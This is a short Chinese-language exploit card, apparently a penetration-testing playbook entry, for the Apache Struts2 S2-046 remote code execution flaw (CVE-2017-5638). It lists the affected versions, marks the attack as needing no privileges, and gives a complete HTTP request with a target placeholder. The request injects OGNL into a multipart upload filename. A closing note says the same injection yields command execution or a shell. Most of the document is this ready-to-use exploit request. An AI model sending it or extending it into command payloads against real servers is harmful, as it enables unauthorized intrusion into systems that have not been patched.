# S2-046 Struts2 远程代码执行 (CVE-2017-5638)

## 指纹特征
- 服务: Apache Struts2 (2.3.5 - 2.3.31, 2.5 - 2.5.10)
- 条件: 漏洞发生在文件上传请求的文件名 (filename) 字段中

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| 文件名 OGNL 注入 | `/` | 无 |

## PoC 指令

通过在 `multipart/form-data` 请求的 `filename` 字段中注入包含 `\x00` 和恶意 OGNL 的 Payload：

```http
POST / HTTP/1.1
Host: {{TARGET}}:8080
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}\x00.jpg"
Content-Type: text/plain

foo
------Boundary--
```

## Success Signal
- **状态验证**: 服务器响应头中包含 `vulhub: 54289`，确认 OGNL 执行成功。
- **物理验证**: 能够通过注入方式执行命令获取回显或 Shell。
